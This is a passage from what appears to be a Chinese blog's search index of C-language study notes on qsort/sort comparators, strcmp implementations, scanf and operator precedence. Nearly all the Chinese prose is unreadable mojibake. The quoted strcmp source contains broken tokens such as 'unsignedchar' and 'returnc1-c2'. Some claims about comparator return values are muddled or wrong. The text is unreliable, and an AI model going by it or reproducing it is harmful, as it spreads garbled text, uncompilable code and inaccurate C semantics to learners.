b;</code>(ä»å°åˆ°å¤§æ’åºï¼‰ï¼Œå®ƒçš„å®è´¨å°±æ˜¯<strong>è¿”å›å€¼ä¸º1è¡¨ç¤º2ä¸ªæ•°æ®ä¸äº¤æ¢ï¼Œè¿”å›å€¼ä¸º0è¡¨ç¤º2ä¸ªæ•°æ®äº¤æ¢ã€‚</strong>è¿™ä¹Ÿå°±è¯´æ˜ä¹Ÿsortçš„cmpä¸èƒ½å†™<code>return a-b;</code>çš„æ ¼å¼ã€‚</p><p>æœ€åæ¥è¯´è¯´å…³äºqsortçš„cmpå®è´¨ï¼š<strong>è¿”å›å€¼ä¸º1è¡¨ç¤ºæ•°æ®éœ€è¦äº¤æ¢ï¼Œè¿”å›å€¼ä¸º-1ä¸éœ€è¦äº¤æ¢ï¼Œ0è¡¨ç¤ºä¸ç¡®å®šã€‚</strong>æ‰€ä»¥qsortçš„cmpçš„<code>return a &gt; b</code>å°±å‡ºç°äº†ä¸ç¡®å®šæ€§ï¼Œåªèƒ½è¿”å›1æˆ–0ï¼Œæ”¹è¿›å†™æ³•å°±æ˜¯å¯¹å®ƒçš„è¯¦ç»†åŒ–ã€‚</p><p><strong>ä¸Šé¢è¯´çš„ä¹Ÿæ˜¯å¾ˆä¹±ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ï¼šqsortçš„cmpä½¿ç”¨ï¼šreturn <code>*return *(int *)a &gt; *(int *)b ? 1:-1;*</code>ï¼ˆ-1ä¸1çš„å…ˆåå†³å®šæ’åºæ–¹å¼ï¼‰ï¼Œsortçš„cmpä½¿ç”¨ï¼š<code>return a &gt; b;</code>(ä»å¤§åˆ°å°æ’åºï¼‰ï¼Œ<code>return a &lt; b;</code>(ä»å°åˆ°å¤§æ’åºï¼‰</strong></p><blockquote><p><strong>è‡³äºç­‰äºå·å†™ä¸å†™ï¼Œçœ‹æ’åºéœ€ä¸éœ€è¦å¯¹ç›¸ç­‰çš„æ•°æ’åºäº¤æ¢ã€‚</strong></p></blockquote><p>æœ€åï¼šsortæ˜¯qsortçš„å‡çº§ï¼Œsortè¿˜æ˜¯æ–¹ä¾¿è®¸å¤šã€‚</p><hr><h2 id="å…³äºstrcmpå‡½æ•°"><a href="#å…³äºstrcmpå‡½æ•°" class="headerlink" title="å…³äºstrcmpå‡½æ•°"></a>å…³äºstrcmpå‡½æ•°</h2><p>ANSIæ ‡å‡†è§„å®šï¼Œè¿”å›å€¼ä¸ºæ­£æ•°ï¼Œè´Ÿæ•°ï¼Œ0 ã€‚è€Œ<strong>ç¡®åˆ‡æ•°å€¼æ˜¯ä¾èµ–ä¸åŒçš„Cå®ç°çš„ã€‚</strong></p><p>1.å½“ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸ç­‰æ—¶ï¼ŒCæ ‡å‡†æ²¡æœ‰è§„å®šè¿”å›å€¼ä¼šæ˜¯1 æˆ– -1ï¼Œåªè§„å®šäº†æ­£æ•°å’Œè´Ÿæ•°ã€‚</p><p>2.æœ‰äº›ä¼šæŠŠä¸¤ä¸ªå­—ç¬¦çš„ASCIIç ä¹‹å·®ä½œä¸ºæ¯”è¾ƒç»“æœç”±å‡½æ•°å€¼è¿”å›ã€‚ä½†æ— è®ºå¦‚ä½•ä¸èƒ½ä»¥æ­¤æ¡ä¾æ®ä½œä¸ºç¨‹åºä¸­çš„æµç¨‹é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memcopy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> strcmp</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(p1,p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p1;    </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p2;    </span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">const</span> unsignedchar *s1=(<span class="keyword">const</span> unsignedchar*)p1;    </span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">const</span> unsignedchar *s2=(<span class="keyword">const</span> unsignedchar*)p2;    </span><br><span class="line">    <span class="keyword">unsigned</span> reg_charc1,c2;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        c1=(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*s1++;        </span><br><span class="line">        c2=(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*s2++;        </span><br><span class="line">        <span class="keyword">if</span>(c1==<span class="string">'\0'</span>)            </span><br><span class="line">        returnc1-c2;    </span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">while</span>(c1==c2);    </span><br><span class="line">        <span class="keyword">return</span> c1-c2;        </span><br><span class="line">&#125;     </span><br><span class="line">libc_hidden_builtin_def(<span class="built_in">strcmp</span>)</span><br><span class="line"><span class="comment">//ä»¥ä¸Šä»£ç æ˜¯K&amp;R Cè§„èŒƒçš„,ASCI Cçš„åœ¨ä¸‹é¢</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*strcmp function*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">int</span>(strap)(<span class="keyword">const</span> <span class="keyword">char</span> *sl,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*compare unsigned char sl[],s2[]*/</span></span><br><span class="line">    <span class="keyword">for</span>(;*sl==*s2;++sl,++s2)</span><br><span class="line">        <span class="keyword">if</span>(*sl==<span class="string">'\0'</span>)</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>((*(unsignedchar*)sl&lt;*(unsignedchar*)s2)?<span class="number">-1</span>:+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcmp</span>å¦å¤–çš„æºä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src,<span class="keyword">const</span> <span class="keyword">char</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!(ret = *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src - *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)dst) &amp;&amp; *dst)</span><br><span class="line">        ++src,++dst;</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">        ret=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(ret&gt;<span class="number">0</span>)</span><br><span class="line">        ret=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>ä¸Šé¢æ‰€è¯´çš„ç¡®åˆ‡æ•°å€¼ä¾èµ–ä¸åŒçš„Cå®ç°ï¼Œåˆšåˆšå»çœ‹äº†ä¸åŒCç‰ˆæœ¬çš„strcmpçš„æºç ï¼Œæœç„¶æœ‰çš„ç‰ˆæœ¬ç¡®å®æ˜¯è¿”å›ï¼š1ï¼Œ-1ï¼Œ0ã€‚</strong></p><p><strong>æ‰€ä»¥ä¸ºäº†èƒ½åœ¨ä¸åŒå¹³å°ä¸Šå…¼å®¹ï¼Œä»¥åç»Ÿä¸€å†™ï¼š&gt;0ï¼Œ==0ï¼Œ&lt;0</strong></p></blockquote><h2 id="å…³äºscanf"><a href="#å…³äºscanf" class="headerlink" title="å…³äºscanf"></a>å…³äºscanf</h2><p>å½“ä½¿ç”¨scanf()ä¸æ˜¯%cçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å…¥æ—¶ï¼Œå®ƒä¸ä¼šæ¥å—ç©ºæ ¼ä¸å›è½¦ã€‚å½“è¾“å…¥çš„æ˜¯ç©ºæ ¼ä¸å›è½¦ï¼Œå®ƒä¼šä¸€ç›´ç­‰å¾…ç”¨æˆ·è¾“å…¥éç©ºæ ¼ä¸å›è½¦ã€‚</p><p>ä¹Ÿå°±æ˜¯å®ƒä¼šè·³è¿‡ç©ºæ ¼çš„æ„æ€ï¼Œç©ºæ ¼æˆ–å›è½¦ä½œä¸ºè¾“å…¥ç»“æŸçš„æ ‡å¿—ã€‚</p><p>å¦å¤–æ³¨æ„ï¼šè¿™é‡Œåªæœ‰æ¥å—ç©ºæ ¼ï¼Œå¦‚æœä¸æ˜¯åˆ™è·³è¿‡è¿™ä¸ªå‡½æ•°ï¼Œç¼“å†²åŒºé‡Œçš„å€¼ä¸å˜ã€‚<img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200806115553020.png" alt="image-20200806115553020"></p><p>æœ€åï¼šå½“æˆ‘ä»¬å‰é¢å› ä¸ºæœ‰è¾“å…¥å¯¼è‡´ç¼“å†²åŒºé‡Œæœ‰ç©ºæ ¼æˆ–å›è½¦æ—¶ï¼Œåé¢æ˜¯ä½¿ç”¨scanf()é<strong>%c</strong>è¾“å…¥ï¼Œæˆ‘ä»¬æ˜¯ä¸éœ€è¦å…ˆåƒæ‰å›è½¦çš„ï¼Œå› ä¸ºscanf()ä¼šè·³è¿‡å®ƒã€‚</p><h2 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>è¿ç®—ç¬¦ä¼˜å…ˆçº§</h2><p>ç™¾åº¦ç»éªŒä¸€ä¸ªæ–‡ç« æ•´ç†çš„ååˆ†æ¸…æ¥šï¼Œè‡ªå·±é€ è½®å­ä¹Ÿæ²¡å¿…è¦ï¼Œè½¬è½½ä¸€ä¸‹ï¼š<a href="https://jingyan.baidu.com/article/ae97a646c865ccbbfd461dd3.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/ae97a646c865ccbbfd461dd3.html</a></p><ol><li><p>æœ€é«˜çº§ï¼šå‡ºç°åŒçº§åˆ«è¿ç®—ç¬¦æ—¶çš„ç»“åˆæ–¹å‘æ˜¯ä»å·¦å¾€å³ï¼ˆä¸‹é¢çº§åˆ«æ²¡å†™ç»“åˆé¡ºåºæ—¶ï¼Œé»˜è®¤æ˜¯ä»å·¦å¾€å³ï¼‰ã€‚</p><p>( )åœ†æ‹¬å·</p><p>[ ]ä¸‹æ ‡è¿ç®—ç¬¦å·</p><p>-&gt;æŒ‡å‘ç»“æ„ä½“æˆå‘˜è¿ç®—ç¬¦</p><p>.ç»“æ„ä½“æˆå‘˜è¿ç®—ç¬¦</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a48bc2e8904800fc058709bad42043715edb93c4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬äºŒçº§ï¼šï¼ã€~ã€++ã€â€“ã€-ã€ï¼ˆç±»å‹ï¼‰ã€*ã€&amp;ã€sizeofã€‚</p><p>è¿™ä¸€çº§éƒ½æ˜¯å•ç›®è¿ç®—ç¬¦å·ï¼Œè¿™ä¸€çº§çš„ç»“åˆæ–¹å‘æ˜¯ä»å³å‘å·¦ã€‚</p><p>æ¯”å¦‚å‡ºç°<em>p++ï¼Œè¿™æ—¶</em>å’Œ++åŒçº§åˆ«ï¼Œå…ˆç®—å³è¾¹ï¼Œå†å·¦è¾¹ã€‚</p><p>æ‰€ä»¥<em>p++ç­‰ä»·äº</em>ï¼ˆp++ï¼‰ï¼Œè€Œä¸æ˜¯ï¼ˆ*pï¼‰++ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/5e9a2820b93acd895ab5b7bb0335dd8a58de8bc4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬ä¸‰çº§ï¼š+ã€-ã€*ã€/ã€%</p><p>è¿™ä¸€çº§éƒ½æ˜¯ç®—æœ¯è¿ç®—ç¬¦ï¼Œç»“åˆé¡ºåºå’Œæ•°å­¦å­¦ä¹ ä¸­ä¸€è‡´çš„ï¼Œå…ˆä¹˜é™¤å–ä½™æ•°ï¼ŒååŠ å‡ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/d400248ca608a50f128cc13810cec7f88b77ffc4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬å››çº§ï¼š&lt;&lt;ã€&gt;&gt;</p><p>è¿™æ˜¯å·¦ç§»ã€å³ç§»è¿ç®—ç¬¦ï¼Œä½è¿ç®—æ—¶å¯èƒ½éœ€è¦ç”¨åˆ°ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/5c9c964ce54a2f27689fb9b2e00192dd3240f4c4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬äº”çº§ï¼š&lt;ã€&lt;=ã€&gt;ã€&gt;=ã€ï¼=ã€==</p><p>è¿™äº›è¿ç®—ç¬¦ä¹Ÿç§°ä¸ºå…³ç³»è¿ç®—ç¬¦ï¼Œå…¶ä¸­&lt;ã€&lt;=ã€&gt;ã€&gt;=é«˜äºï¼=ã€==ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/979906196120a7cdab1e6a4689b375d7987bdcc4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬å…­çº§ï¼š&amp;ã€^ã€|</p><p>è¿™ä¸‰ä¸ªç¬¦å·ä¹Ÿæ˜¯ä½è¿ç®—ç¬¦å·ï¼Œå…¶ä¸­å†…ä¼˜å…ˆçº§ï¼Œ&amp;&gt;^&gt;|ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/50189b40102a04e2ffd2abf62b7aa010bd33c2c4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬ä¸ƒçº§ï¼š&amp;&amp;ã€||</p><p>é€»è¾‘ä¸&amp;&amp;ä¼˜å…ˆçº§å¤§äºé€»è¾‘æˆ–||ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/116b1ae23ea23a42630a31a43733ec3835bbc0c4.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬å…«çº§ï¼šï¼Ÿ  ï¼š</p><p>ä¹Ÿç§°ä¸ºæ¡ä»¶è¿ç®—ç¬¦å·ï¼Œæ˜¯Cè¯­è¨€ä¸­å”¯ä¸€çš„ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦ï¼Œç»“åˆé¡ºåºæ˜¯ä»å³å¾€å·¦ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/3fe32442a07aa01079437d8cbfbb19efa35f3ec5.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>ç¬¬ä¹çº§ï¼š=ã€+=ã€-+ã€*=ã€/=ã€%=</p><p>è¿™äº›è¿ç®—ç¬¦ä¹Ÿå«åšèµ‹å€¼è¿ç®—ç¬¦ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œ&gt;&gt;=ã€&lt;&lt;=ã€&amp;=ã€^=ã€|=è¿™äº›èµ‹å€¼è¿ç®—ç¬¦ä¹Ÿåœ¨è¿™ä¸€çº§åˆ«å†…ï¼Œç»“åˆé¡ºåºæ˜¯ä»å³å¾€å·¦ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a151a233ec3834bbd19f33eb8714c27bd3823dc5.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li><li><p>æœ€ä½çº§ï¼šï¼Œ</p><p>é€—å·è¿ç®—ç¬¦ä¹Ÿç§°ä¸ºé¡ºåºæ±‚å€¼è¿ç®—ç¬¦ï¼Œåœ¨Cè¯­è¨€ä¸­ï¼Œè¿ç®—çº§åˆ«æœ€ä½ã€‚</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/a31e1214c27bd2824bf930f23cb1eef97ebd36c5.jpg" alt="Cè¯­è¨€è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§å…¨"></p></li></ol><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ol><li><p>æ€»çš„æ¥è¯´ï¼Œ<strong>åˆçº§è¿ç®—ç¬¦</strong>( )ã€[ ]ã€-&gt;ã€.  é«˜äº  <strong>å•ç›®è¿ç®—ç¬¦</strong>  é«˜äº  <strong>ç®—æ•°è¿ç®—ç¬¦</strong>ï¼ˆå…ˆä¹˜é™¤ååŠ å‡ï¼‰  é«˜äº  <strong>å…³ç³»è¿ç®—ç¬¦</strong>  é«˜äº  <strong>é€»è¾‘è¿ç®—ç¬¦</strong>ï¼ˆä¸åŒ…æ‹¬ï¼ï¼‰  é«˜äº  <strong>æ¡ä»¶è¿ç®—ç¬¦</strong>  é«˜äº  <strong>èµ‹å€¼è¿ç®—ç¬¦</strong>  é«˜äº  <strong>é€—å·è¿ç®—ç¬¦ã€‚</strong></p><p><strong>ä½è¿ç®—ç¬¦</strong>çš„ä¼˜å…ˆçº§æ¯”è¾ƒåˆ†æ•£ã€‚</p></li><li><p>é™¤äº†èµ‹å€¼è¿ç®—ç¬¦ã€æ¡ä»¶è¿ç®—ç¬¦ã€å•ç›®è¿ç®—ç¬¦ä¸‰ç±»çš„å¹³çº§è¿ç®—ç¬¦ä¹‹é—´çš„ç»“åˆé¡ºåºæ˜¯<strong>ä»å³è‡³å·¦</strong>ï¼Œå…¶ä»–éƒ½æ˜¯ä»å·¦è‡³å³ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€å­¦ä¹  </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
